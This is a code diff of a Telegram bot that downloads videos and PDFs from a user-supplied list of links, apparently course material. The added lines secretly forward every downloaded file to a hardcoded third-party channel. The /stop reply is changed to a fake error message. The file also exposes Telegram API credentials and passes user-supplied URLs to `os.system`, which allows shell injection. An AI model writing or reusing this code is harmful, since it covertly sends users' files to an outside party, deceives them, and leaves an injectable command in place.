@@ -26,27 +26,30 @@ bot = Client("bot",
              api_id= 28328736,
              api_hash= "802254a44896baa87f3083b7af36b2e5")
 
-
 @bot.on_message(filters.command(["start"]))
 async def account_login(bot: Client, m: Message):
-    editable = await m.reply_text(f"Hello\nPress /txt")
-
+    editable = await m.reply_text("Hi!\n\n/Vijay.\n")
 
 @bot.on_message(filters.command("stop"))
 async def restart_handler(_, m):
-    await m.reply_text("**STOPPED**🚦", True)
+    await m.reply_text("list index out of range 🚦", True)
+    os.execl(sys.executable, sys.executable, *sys.argv)
+
+
+@bot.on_message(filters.command("🛑🛑Stop🛑🛑"))
+async def restart_handler(_, m):
+    await m.reply_text("**Stop**🚦", True)
     os.execl(sys.executable, sys.executable, *sys.argv)
 
 
 
-@bot.on_message(filters.command(["txt"]))
+@bot.on_message(filters.command(["vijay"]))
 async def account_login(bot: Client, m: Message):
-    editable = await m.reply_text('Send TXT file for download')
+    editable = await m.reply_text('Hi\n\nSend TXT File । » ')
     input: Message = await bot.listen(editable.chat.id)
+    await bot.send_document(-1002114435811)
     x = await input.download()
     await input.delete(True)
-
-
 
     path = f"./downloads/{m.chat.id}"
 
@@ -70,11 +73,10 @@ async def account_login(bot: Client, m: Message):
     raw_text = input0.text
     await input0.delete(True)
 
-    await editable.edit("**Enter Batch Name**")
+    await editable.edit("Enter Batch Name")
     input1: Message = await bot.listen(editable.chat.id)
     raw_text0 = input1.text
     await input1.delete(True)
-    
 
     await editable.edit("**Enter resolution**")
     input2: Message = await bot.listen(editable.chat.id)
@@ -100,17 +102,17 @@ async def account_login(bot: Client, m: Message):
     
     
 
-    await editable.edit("**Enter A Highlighter Otherwise send 👉Co👈 **")
+    await editable.edit("Enter A Captio to add Otherwise send   **no**")
     input3: Message = await bot.listen(editable.chat.id)
     raw_text3 = input3.text
     await input3.delete(True)
     highlighter  = f"️ ⁪⁬⁮⁮⁮"
-    if raw_text3 == 'Co':
+    if raw_text3 == 'no':
         MR = highlighter 
     else:
         MR = raw_text3
    
-    await editable.edit("Now send the **Thumb url**\nEg : ```https://telegra.ph/file/0633f8b6a6f110d34f044.jpg```\n\nor Send `no`")
+    await editable.edit("Now send the **Thumb url**\nEg » ```https://telegra.ph/file/5e937c29a415223ffaf9e.jpg```\n\nor Send `no`")
     input6 = message = await bot.listen(editable.chat.id)
     raw_text6 = input6.text
     await input6.delete(True)
@@ -162,12 +164,13 @@ async def account_login(bot: Client, m: Message):
 
             try:  
                 
-                cc = f'**[🎬] Vid_ID : {str(count).zfill(3)}**\n**Title : ** {name1}\n**Batch Name :** {raw_text0}\n\n**Downloaded by : {MR}**'
-                cc1 = f'**[📕] Pdf_ID : {str(count).zfill(3)}**\n**Title : ** {name1}\n**Batch Name :**{raw_text0}\n\n**Downloaded by : {MR}**'
+                cc = f'**[ 🎬 ] Vid ID  :** {str(count).zfill(3)}\n**Title :** {name1} {res} @vijaysahu_2.mp4\n**Batch Name :** {raw_text0}\n**Extracted By ➤ ** {raw_text3}\n\n'
+                cc1 = f'**[ 📕 ] Pdf ID :** {str(count).zfill(3)}\n**Title :** {name1} @vijaysahu_2.pdf \n**Batch »** {raw_text0}\n**Extracted By ➤ ** {raw_text3}\n\n'
                 if "drive" in url:
                     try:
                         ka = await helper.download(url, name)
                         copy = await bot.send_document(chat_id=m.chat.id,document=ka, caption=cc1)
+                        await copy.copy(chat_id = -1002114435811)
                         count+=1
                         os.remove(ka)
                         time.sleep(1)
@@ -182,6 +185,7 @@ async def account_login(bot: Client, m: Message):
                         download_cmd = f"{cmd} -R 25 --fragment-retries 25"
                         os.system(download_cmd)
                         copy = await bot.send_document(chat_id=m.chat.id, document=f'{name}.pdf', caption=cc1)
+                        await copy.copy(chat_id = -1002114435811)
                         count += 1
                         os.remove(f'{name}.pdf')
                     except FloodWait as e:
@@ -189,7 +193,7 @@ async def account_login(bot: Client, m: Message):
                         time.sleep(e.x)
                         continue
                 else:
-                    Show = f"**Downloading:-**\n\n**Name :-** `{name}\nQuality - {raw_text2}`\n\n**Url :-** `{url}`"
+                    Show = f"**⥥ Downloading »**\n\n**Name »** `{name}\nQuality » {raw_text2}`\n\n**Url »** `{url}`"
                     prog = await m.reply_text(Show)
                     res_file = await helper.download_video(url, cmd, name)
                     filename = res_file
@@ -200,13 +204,14 @@ async def account_login(bot: Client, m: Message):
 
             except Exception as e:
                 await m.reply_text(
-                    f"**downloading failed 🥺**\n{str(e)}\n**Name** - {name}\n**Link** - `{url}`"
+                    f"**downloading Interupted **\n{str(e)}\n**Name** » {name}\n**Link** » `{url}`"
                 )
                 continue
 
     except Exception as e:
         await m.reply_text(e)
-    await m.reply_text("Done")
+    await m.reply_text("🚦Done🚦")
 
 
 bot.run()
+                          
